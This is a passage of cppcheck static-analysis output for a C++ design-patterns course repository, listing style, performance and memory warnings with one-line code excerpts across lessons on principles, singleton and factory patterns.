D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:74:21: style: struct member 'NotificationRecipient::pushToken' is never used. [unusedStructMember]
        std::string pushToken;
                    ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:77:21: style: struct member 'NotificationRecipient::timezone' is never used. [unusedStructMember]
        std::string timezone;
                    ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:78:21: style: struct member 'NotificationRecipient::language' is never used. [unusedStructMember]
        std::string language;
                    ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:540:21: style: struct member 'LogEntry::threadId' is never used. [unusedStructMember]
        std::string threadId;
                    ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:542:44: style: struct member 'LogEntry::metadata' is never used. [unusedStructMember]
        std::map<std::string, std::string> metadata;
                                           ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:543:21: style: struct member 'LogEntry::correlationId' is never used. [unusedStructMember]
        std::string correlationId;
                    ^
32/194 files checked 19% done
Checking D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\comparison_analysis.cpp ...
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\comparison_analysis.cpp:304:14: style: inconclusive: Technically the member function 'InheritanceFlexibilityDemo::BadCar::openTrunk' can be const. [functionConst]
        void openTrunk() {
             ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\comparison_analysis.cpp:317:14: style: inconclusive: Technically the member function 'InheritanceFlexibilityDemo::BadTruck::loadCargo' can be const. [functionConst]
        void loadCargo() {
             ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\comparison_analysis.cpp:385:14: style: inconclusive: Technically the member function 'CompositionFlexibilityDemo::GoodVehicle::start' can be const. [functionConst]
        void start() {
             ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\comparison_analysis.cpp:121:9: style: Class 'Circle' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
        Circle(double r) : radius(r) {}
        ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\comparison_analysis.cpp:203:9: style: Class 'CircleAreaCalculator' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
        CircleAreaCalculator(double r) : radius(r) {}
        ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\comparison_analysis.cpp:439:9: style: Class 'BadDatabaseConnection' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
        BadDatabaseConnection(const std::string& connStr)
        ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\comparison_analysis.cpp:470:9: style: Class 'BadMySQLConnection' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
        BadMySQLConnection(const std::string& connStr) : BadDatabaseConnection(connStr) {}
        ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\comparison_analysis.cpp:522:9: style: Class 'MySQLConnection' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
        MySQLConnection(const std::string& connStr)
        ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\comparison_analysis.cpp:584:9: style: Class 'DatabaseService' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
        DatabaseService(std::unique_ptr<IDatabaseConnection> conn)
        ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\comparison_analysis.cpp:163:23: style: Consider using std::accumulate algorithm instead of a raw loop. [useStlAlgorithm]
            totalArea += shape->getArea();
                      ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\comparison_analysis.cpp:256:23: style: Consider using std::accumulate algorithm instead of a raw loop. [useStlAlgorithm]
            totalArea += shape->getArea();
                      ^
33/194 files checked 20% done
Checking D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp ...
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:0:0: information: Limiting analysis of branches. Use --check-level=exhaustive to analyze all branches. [normalCheckLevelMaxBranches]

^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:402:38: style: inconclusive: Member variable 'PaymentProcessor::paymentStrategy' is in the wrong place in the initializer list. [initializerList]
    std::unique_ptr<PaymentStrategy> paymentStrategy;
                                     ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:407:32: note: Member variable 'PaymentProcessor::paymentStrategy' is in the wrong place in the initializer list.
        : processorName(name), paymentStrategy(std::move(strategy)) {}
                               ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:402:38: note: Member variable 'PaymentProcessor::paymentStrategy' is in the wrong place in the initializer list.
    std::unique_ptr<PaymentStrategy> paymentStrategy;
                                     ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:76:10: style: inconclusive: Technically the member function 'BadCar::openTrunk' can be const. [functionConst]
    void openTrunk() {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:88:10: style: inconclusive: Technically the member function 'BadMotorcycle::wheelie' can be const. [functionConst]
    void wheelie() {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:141:10: style: inconclusive: Technically the member function 'Engine::accelerate' can be const. [functionConst]
    void accelerate() {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:174:10: style: inconclusive: Technically the member function 'Wheel::brake' can be const. [functionConst]
    void brake() {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:299:10: style: inconclusive: Technically the member function 'GoodVehicle::brake' can be const. [functionConst]
    void brake() {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:580:10: style: inconclusive: Technically the member function 'Animal::showAbilities' can be const. [functionConst]
    void showAbilities() {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:190:5: style: Class 'FuelTank' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    FuelTank(int tankCapacity, const std::string& type = "gasoline")
    ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:371:5: style: Class 'PayPalPayment' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    PayPalPayment(const std::string& emailAddr) : email(emailAddr) {}
    ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:388:5: style: Class 'BankTransferPayment' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    BankTransferPayment(const std::string& account) : accountNumber(account) {}
    ^
34/194 files checked 21% done
Checking D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_inheritance_vulnerabilities.cpp ...
35/194 files checked 22% done
Checking D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\exploits\composition_inheritance_exploits.cpp ...
36/194 files checked 22% done
Checking D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp ...
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:46:9: performance: Variable 'data' is assigned in constructor body. Consider performing initialization in initialization list. [useInitializationList]
        data = {1, 2, 3, 4, 5};
        ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:167:10: style: inconclusive: Technically the member function 'Mammal::feedMilk' can be const. [functionConst]
    void feedMilk() {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:188:10: style: inconclusive: Technically the member function 'WingedAnimal::fly' can be const. [functionConst]
    void fly() {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:209:10: performance: inconclusive: Technically the member function 'BadBat::demonstrateProblem' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void demonstrateProblem() {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:405:10: style: inconclusive: Technically the member function 'BadMySQLConnection::useDatabase' can be const. [functionConst]
    void useDatabase(const std::string& dbName) {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:412:10: style: inconclusive: Technically the member function 'BadMySQLConnection::showTables' can be const. [functionConst]
    void showTables() {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:441:10: style: inconclusive: Technically the member function 'BadPostgreSQLConnection::createSchema' can be const. [functionConst]
    void createSchema(const std::string& schemaName) {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:448:10: style: inconclusive: Technically the member function 'BadPostgreSQLConnection::createExtension' can be const. [functionConst]
    void createExtension(const std::string& extensionName) {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:62:18: style: Virtual function 'printData' is called from constructor 'BadBaseClass()' at line 48. Dynamic binding is not used. [virtualCallInConstructor]
    virtual void printData() const {
                 ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:48:9: note: Calling printData
        printData();
        ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:62:18: note: printData is a virtual function
    virtual void printData() const {
                 ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:355:18: style: Virtual function 'disconnect' is called from destructor '~BadDatabaseConnection()' at line 346. Dynamic binding is not used. [virtualCallInConstructor]
    virtual void disconnect() {
                 ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:346:13: note: Calling disconnect
            disconnect();
            ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:355:18: note: disconnect is a virtual function
    virtual void disconnect() {
                 ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:88:5: style: Class 'BadDerivedClass' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    BadDerivedClass(int mult = 3) : multiplier(mult) {
    ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:263:5: style: Class 'BadSquare' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    BadSquare(int side) : BadRectangle(side, side) {
    ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:339:5: style: Class 'BadDatabaseConnection' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    BadDatabaseConnection(const std::string& connStr)
    ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:389:5: style: Class 'BadMySQLConnection' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    BadMySQLConnection(const std::string& connStr, const std::string& version = "8.0")
    ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:425:5: style: Class 'BadPostgreSQLConnection' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    BadPostgreSQLConnection(const std::string& connStr, const std::string& version = "13")
    ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:111:21: style: Consider using std::accumulate algorithm instead of a raw loop. [useStlAlgorithm]
                sum += value;
                    ^
37/194 files checked 23% done
Checking D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\secure_composition_inheritance_alternatives.cpp ...
38/194 files checked 23% done
Checking D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\dependency_injection_vulnerabilities.cpp ...
39/194 files checked 24% done
Checking D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\di_basics.cpp ...
D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\di_basics.cpp:46:10: performance: inconclusive: Technically the member function 'BadEmailService::sendEmail' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void sendEmail(const std::string& to, const std::string& subject, const std::string& body) {
         ^
D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\di_basics.cpp:55:10: performance: inconclusive: Technically the member function 'BadSMSService::sendSMS' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void sendSMS(const std::string& phone, const std::string& message) {
         ^
D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\di_basics.cpp:63:10: performance: inconclusive: Technically the member function 'BadDatabaseService::saveUser' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void saveUser(const std::string& userData) {
         ^
D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\di_basics.cpp:68:17: performance: inconclusive: Technically the member function 'BadDatabaseService::getUserData' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    std::string getUserData(int userId) {
                ^
D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\di_basics.cpp:76:10: performance: inconclusive: Technically the member function 'BadLogger::log' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void log(const std::string& message) {
         ^
D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\di_basics.cpp:335:10: style: inconclusive: Technically the member function 'GoodUserService::printDependencies' can be const. [functionConst]
    void printDependencies() {
         ^
D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\di_basics.cpp:180:5: style: Class 'EmailService' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    EmailService(const std::string& server = "smtp.gmail.com", int serverPort = 587)
    ^
D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\di_basics.cpp:202:5: style: Class 'SMSService' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    SMSService(const std::string& smsProvider = "Twilio", const std::string& key = "api_key_123")
    ^
D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\di_basics.cpp:223:5: style: Class 'DatabaseService' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    DatabaseService(const std::string& connStr = "localhost:5432/mydb", const std::string& type = "PostgreSQL")
    ^
D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\di_basics.cpp:248:5: style: Class 'Logger' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    Logger(const std::string& level = "INFO", const std::string& format = "TIMESTAMP")
    ^
40/194 files checked 25% done
Checking D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\exploits\dependency_injection_exploits.cpp ...
41/194 files checked 25% done
Checking D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\secure_dependency_injection_alternatives.cpp ...
42/194 files checked 25% done
Checking D:\Work\Patterns\03-creational\lesson_3_1_singleton\exploits\singleton_exploits.cpp ...
D:\Work\Patterns\03-creational\lesson_3_1_singleton\exploits\singleton_exploits.cpp:56:10: style: inconclusive: Technically the member function 'VulnerableSingleton::checkAdminAccess' can be const. [functionConst]
    bool checkAdminAccess(const char* password) {
         ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\exploits\singleton_exploits.cpp:67:10: style: inconclusive: Technically the member function 'VulnerableSingleton::performAdminAction' can be const. [functionConst]
    void performAdminAction() {
         ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\exploits\singleton_exploits.cpp:177:9: style: inconclusive: Technically the member function 'CorruptibleSingleton::getData' can be const. [functionConst]
    int getData(size_t index) {
        ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\exploits\singleton_exploits.cpp:40:9: warning: Class 'VulnerableSingleton' does not have a copy constructor which is recommended since it has dynamic memory/resource allocation(s). [noCopyConstructor]
        adminPassword = new char[256];
        ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\exploits\singleton_exploits.cpp:40:9: warning: Class 'VulnerableSingleton' does not have a operator= which is recommended since it has dynamic memory/resource allocation(s). [noOperatorEq]
        adminPassword = new char[256];
        ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\exploits\singleton_exploits.cpp:155:9: warning: Class 'CorruptibleSingleton' does not have a copy constructor which is recommended since it has dynamic memory/resource allocation(s). [noCopyConstructor]
        data = new int[size];
        ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\exploits\singleton_exploits.cpp:155:9: warning: Class 'CorruptibleSingleton' does not have a operator= which is recommended since it has dynamic memory/resource allocation(s). [noOperatorEq]
        data = new int[size];
        ^
43/194 files checked 26% done
Checking D:\Work\Patterns\03-creational\lesson_3_1_singleton\modern_singleton.cpp ...
D:\Work\Patterns\03-creational\lesson_3_1_singleton\modern_singleton.cpp:247:10: performance: inconclusive: Technically the member function 'LoggerService::log' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void log(const std::string& message) {
         ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\modern_singleton.cpp:251:10: performance: inconclusive: Technically the member function 'LoggerService::info' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void info(const std::string& message) {
         ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\modern_singleton.cpp:255:10: performance: inconclusive: Technically the member function 'LoggerService::error' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void error(const std::string& message) {
         ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\modern_singleton.cpp:65:5: style: Class 'RAIISingleton' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    RAIISingleton(const std::string& data) : data_(data) {
    ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\modern_singleton.cpp:351:11: style: Variable 'singleton' can be declared as reference to const [constVariableReference]
    auto& singleton = RAIISingleton::getInstance();
          ^
44/194 files checked 27% done
Checking D:\Work\Patterns\03-creational\lesson_3_1_singleton\secure_singleton_alternatives.cpp ...
D:\Work\Patterns\03-creational\lesson_3_1_singleton\secure_singleton_alternatives.cpp:193:5: style: Class 'AdminService' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    AdminService(const std::string& password)
    ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\secure_singleton_alternatives.cpp:368:19: style: Variable 'instance' can be declared as reference to const [constVariableReference]
            auto& instance = SecureSingletonV1::getInstance();
                  ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\secure_singleton_alternatives.cpp:410:11: style: Variable 'adminService' can be declared as reference to const [constVariableReference]
    auto& adminService = container.getAdminService();
          ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\secure_singleton_alternatives.cpp:425:11: style: Variable 'instance' can be declared as reference to const [constVariableReference]
    auto& instance = SecureSingletonV4::getInstance();
          ^
45/194 files checked 27% done
Checking D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_cpp23_comparison.cpp ...
D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_cpp23_comparison.cpp:312:15: style: Variable 's' can be declared as reference to const [constVariableReference]
        auto& s = cpp17::Singleton::getInstance();
              ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_cpp23_comparison.cpp:334:15: style: Variable 's' can be declared as reference to const [constVariableReference]
        auto& s = cpp23::Singleton::getInstance();
              ^
46/194 files checked 28% done
Checking D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_pattern.cpp ...
D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_pattern.cpp:222:10: style: inconclusive: Technically the member function 'Logger::log' can be const. [functionConst]
    void log(const std::string& level, const std::string& message) {
         ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_pattern.cpp:92:17: warning: Identical inner 'if' condition is always true. [identicalInnerCondition]
            if (!instance_) {
                ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_pattern.cpp:90:13: note: outer condition: !instance_
        if (!instance_) {
            ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_pattern.cpp:92:17: note: identical inner condition: !instance_
            if (!instance_) {
                ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_pattern.cpp:257:11: style: Variable 'singleton2' can be declared as pointer to const [constVariablePointer]
    auto* singleton2 = ClassicSingleton::getInstance();
          ^
47/194 files checked 29% done
Checking D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_vulnerabilities.cpp ...
D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_vulnerabilities.cpp:69:24: warning: Class 'LeakySingleton' does not have a copy constructor which is recommended since it has dynamic memory/resource allocation(s). [noCopyConstructor]
    LeakySingleton() : data(new std::vector<int>(1000000)) {
                       ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_vulnerabilities.cpp:69:24: warning: Class 'LeakySingleton' does not have a operator= which is recommended since it has dynamic memory/resource allocation(s). [noOperatorEq]
    LeakySingleton() : data(new std::vector<int>(1000000)) {
                       ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_vulnerabilities.cpp:99:31: warning: Class 'UseAfterFreeSingleton' does not have a copy constructor which is recommended since it has dynamic memory/resource allocation(s). [noCopyConstructor]
    UseAfterFreeSingleton() : buffer(new char[1024]) {
                              ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_vulnerabilities.cpp:99:31: warning: Class 'UseAfterFreeSingleton' does not have a operator= which is recommended since it has dynamic memory/resource allocation(s). [noOperatorEq]
    UseAfterFreeSingleton() : buffer(new char[1024]) {
                              ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_vulnerabilities.cpp:142:35: warning: Class 'ReferenceCountedSingleton' does not have a copy constructor which is recommended since it has dynamic memory/resource allocation(s). [noCopyConstructor]
    ReferenceCountedSingleton() : refCount(new int(1)), data(100) {
                                  ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_vulnerabilities.cpp:142:35: warning: Class 'ReferenceCountedSingleton' does not have a operator= which is recommended since it has dynamic memory/resource allocation(s). [noOperatorEq]
    ReferenceCountedSingleton() : refCount(new int(1)), data(100) {
                                  ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\singleton_vulnerabilities.cpp:219:10: style: Variable 'instance' can be declared as pointer to const [constVariablePointer]
    auto instance = ReferenceCountedSingleton::getInstance();
         ^
48/194 files checked 29% done
Checking D:\Work\Patterns\03-creational\lesson_3_2_factory_method\exploits\factory_method_exploits.cpp ...
49/194 files checked 29% done
Checking D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method.cpp ...
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method.cpp:336:19: style: Consider using std::transform algorithm instead of a raw loop. [useStlAlgorithm]
            types.push_back(pair.first);
                  ^
50/194 files checked 30% done
Checking D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_cpp23_comparison.cpp ...
51/194 files checked 30% done
Checking D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp ...
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:44:9: warning: Possible leak in public function. The pointer 'buffer' is not deallocated before it is allocated. [publicAllocationError]
        buffer = new char[size];
        ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:114:9: warning: Possible leak in public function. The pointer 'lastObject' is not deallocated before it is allocated. [publicAllocationError]
        lastObject = new char[size];
        ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:227:12: style: inconclusive: Same expression used in consecutive assignments of 'largeCount' and 'largeSize'. [duplicateAssignExpression]
    size_t largeCount = SIZE_MAX / 2;
           ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:228:12: note: Same expression used in consecutive assignments of 'largeCount' and 'largeSize'.
    size_t largeSize = SIZE_MAX / 2;
           ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:227:12: note: Same expression used in consecutive assignments of 'largeCount' and 'largeSize'.
    size_t largeCount = SIZE_MAX / 2;
           ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:146:16: style: Local variable 'totalSize' shadows outer variable [shadowVariable]
        size_t totalSize = count * elementSize;
               ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:136:12: note: Shadowed declaration
    size_t totalSize;
           ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:146:16: note: Shadow variable
        size_t totalSize = count * elementSize;
               ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:175:11: style: Variable 'obj1' can be declared as pointer to const [constVariablePointer]
    void* obj1 = factory.createObject(100);
          ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:179:11: style: Variable 'obj2' can be declared as pointer to const [constVariablePointer]
    void* obj2 = factory.createObject(SIZE_MAX);
          ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:190:15: style: Variable 'obj1' can be declared as pointer to const [constVariablePointer]
        void* obj1 = factory.createObject(100);
              ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:194:15: style: Variable 'obj2' can be declared as pointer to const [constVariablePointer]
        void* obj2 = factory.createObject(2000000);
              ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:211:11: style: Variable 'charObj' can be declared as pointer to const [constVariablePointer]
    char* charObj = static_cast<char*>(factory.getLastObject());
          ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:223:11: style: Variable 'obj1' can be declared as pointer to const [constVariablePointer]
    void* obj1 = factory.createObject(100, 10);
          ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:231:11: style: Variable 'obj2' can be declared as pointer to const [constVariablePointer]
    void* obj2 = factory.createObject(largeCount, largeSize);
          ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:175:16: style: Variable 'obj1' is assigned a value that is never used. [unreadVariable]
    void* obj1 = factory.createObject(100);
               ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:179:16: style: Variable 'obj2' is assigned a value that is never used. [unreadVariable]
    void* obj2 = factory.createObject(SIZE_MAX);
               ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:175:11: style: Variable 'obj1' is assigned a value that is never used. [unreadVariable]
    void* obj1 = factory.createObject(100);
          ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:179:11: style: Variable 'obj2' is assigned a value that is never used. [unreadVariable]
    void* obj2 = factory.createObject(SIZE_MAX);
          ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:190:15: style: Variable 'obj1' is assigned a value that is never used. [unreadVariable]
        void* obj1 = factory.createObject(100);
              ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:194:15: style: Variable 'obj2' is assigned a value that is never used. [unreadVariable]
        void* obj2 = factory.createObject(2000000);
              ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:223:16: style: Variable 'obj1' is assigned a value that is never used. [unreadVariable]
    void* obj1 = factory.createObject(100, 10);
               ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method_vulnerabilities.cpp:223:11: style: Variable 'obj1' is assigned a value that is never used. [unreadVariable]
    void* obj1 = factory.createObject(100, 10);
          ^
52/194 files checked 31% done
Checking D:\Work\Patterns\03-creational\lesson_3_2_factory_method\product_factory.cpp ...
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\product_factory.cpp:0:0: information: Limiting analysis of branches. Use --check-level=exhaustive to analyze all branches. [normalCheckLevelMaxBranches]

^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\product_factory.cpp:158:10: style: inconclusive: Technically the member function 'NPC::talk' can be const. [functionConst]
    void talk() {
         ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\product_factory.cpp:63:5: style: Class 'Player' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    Player(const std::string& name, int health = 100, int damage = 20)
    ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\product_factory.cpp:323:33: style: Variable 'displayText' is assigned a value that is never used. [unreadVariable]
        std::string displayText = text_.empty() ? placeholder_ : text_;
                                ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\product_factory.cpp:323:21: style: Variable 'displayText' is assigned a value that is never used. [unreadVariable]
        std::string displayText = text_.empty() ? placeholder_ : text_;
                    ^
53/194 files checked 31% done
Checking D:\Work\Patterns\03-creational\lesson_3_2_factory_method\secure_factory_method_alternatives.cpp ...
54/194 files checked 32% done
Checking D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_cpp23_comparison.cpp ...
55/194 files checked 32% done
Checking D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp ...
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:231:11: style: Variable 'charObj' can be declared as pointer to const [constVariablePointer]
    char* charObj = static_cast<char*>(factory.getObject(0));
          ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:245:15: style: Variable 'obj1' can be declared as pointer to const [constVariablePointer]
        void* obj1 = factory.createObject(100, "small");
              ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:249:15: style: Variable 'obj2' can be declared as pointer to const [constVariablePointer]
        void* obj2 = factory.createObject(2000000, "large");
              ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:262:11: style: Variable 'obj1' can be declared as pointer to const [constVariablePointer]
    void* obj1 = factory.createObjectArray(10, 100);
          ^
